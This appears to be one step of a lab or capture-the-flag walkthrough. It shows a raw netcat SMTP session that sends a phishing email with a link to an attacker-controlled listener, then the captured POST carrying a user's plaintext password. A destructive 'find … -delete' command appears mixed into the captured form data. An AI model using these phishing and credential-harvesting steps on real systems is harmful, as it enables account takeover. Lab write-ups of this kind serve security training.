# 5 sending mail to phish

```
# tried mike.ross and sarah.lorem
# brian.moore worked

$ nc -vn 192.168.175.137 25
(UNKNOWN) [192.168.175.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
HELO x
250 postfish.off
MAIL FROM: kashz
250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
YeeHaw!
http://192.168.49.175:9000/
-$
.
250 2.0.0 Ok: queued as E369F458FA
QUIT
221 2.0.0 Bye

$ nc -lvnp 9000
listening on [any] 9000 ...
connect to [192.168.49.175] from (UNKNOWN) [192.168.175.137] 42528
POST / HTTP/1.1
Host: 192.168.49.175:9000
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 207
Content-Type: application/x-www-form-urlencoded

first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE

# url_decoded
first_name=Brian&last_name=Moore&email=brian.moore%postfish.off&username=brian.moore&password=EternaLSunshinE&confifind /var/mail/ -type f ! -name sales -delete_password=EternaLSunshinE
```
